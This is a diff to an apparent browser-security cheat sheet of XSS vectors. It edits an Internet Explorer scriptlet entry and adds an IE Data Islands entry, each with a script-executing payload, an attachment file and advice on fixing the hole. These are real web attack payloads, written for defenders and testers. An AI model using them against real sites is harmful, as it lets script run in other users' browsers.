@@ -1652,15 +1652,15 @@ var items =
             'samedomain'    : '1',            
             'path'          : '',
             'name'          : 'test.sct',
-            'raw'           : '<SCRIPTLET><IMPLEMENTS Type="Behavior"></IMPLEMENTS><SCRIPT Language="javascript">alert(1)</SCRIPT></SCRIPTLET>'
+            'raw'           : '<SCRIPTLET><IMPLEMENTS Type="Behavior"></IMPLEMENTS><SCRIPT Language="javascript">%js_alert%</SCRIPT></SCRIPTLET>'
         },        
         'description': {
-            'en' : 'Almost all browsers supporting data URIs allow executing JavaScript via crafted <EMBED> "src" attribute value - even if base64 dencoded. Only Firefox attempts to search for a plugin handler and fails.',
+            'en' : 'Internet Explorer supports Scriptlets as an alternative binding method for Data Islands. By using the shown examples JavaScript will execute without user interaction.',
             'jp' : '',
             'ru' : '',
             'de' : ''
         },
-        'urls'    : ['http://msdn.microsoft.com/en-us/library/aa189871%28office.10%29.aspx'],
+        'urls'    : ['http://msdn.microsoft.com/en-us/library/aa189871%28office.10%29.aspx', 'http://msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx'],
         'howtofix'   : {
             'en' : 'Users should not be able to either submit CSS or HTML containing style attributes. If necessary make sure the "behavior" property is not whitelisted.',
             'ja' : '',
@@ -1670,7 +1670,43 @@ var items =
         'browsers'   : {
             'internet explorer': ['6.0', '7.0', '8.0', '9.0']
         },
-        'tags'       : ['xss', 'javascript', 'scriptlet', 'internet explorer', 'style', 'scc', 'sct'],
+        'tags'       : ['xss', 'javascript', 'behavior', 'scriptlet', 'internet explorer', 'style', 'css', 'sct'],
+        'reporter'   : '.mario'
+    },
+    { /* ID 53 - Internet Explorer Data Islands executing JavaScript */
+        'id'         : 53,
+        'category'   : 'behavior', 
+        'name'       : {
+            'en' : 'Internet Explorer Scriptlets executing JavaScript',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'data'       : '<xml id="xss" src="%htc_path%"></xml><label dataformatas="html" datasrc="#xss" datafld="payload"></label>',
+        'attachment' : {
+            'required_mime' : '',
+            'samedomain'    : '1',            
+            'path'          : '',
+            'name'          : 'test.htc',
+            'raw'           : '<?xml version="1.0"?><x><payload><![CDATA[<img src=x onerror=%js_alert%>]]></payload></x>'
+        },        
+        'description': {
+            'en' : 'Internet Explorer supports Data Islands and an XMLish binding method. By using the shown examples JavaScript will execute without user interaction.',
+            'jp' : '',
+            'ru' : '',
+            'de' : ''
+        },
+        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx'],
+        'howtofix'   : {
+            'en' : 'Users should not be able to submit HTML containing <XML> tags. If necessary make sure the "dataformatas" and "datasrc" attributes are not whitelisted.',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
+        },
+        'tags'       : ['xss', 'javascript', 'behavior', 'internet explorer', 'style', 'css', 'data island'],
         'reporter'   : '.mario'
     }
 ]
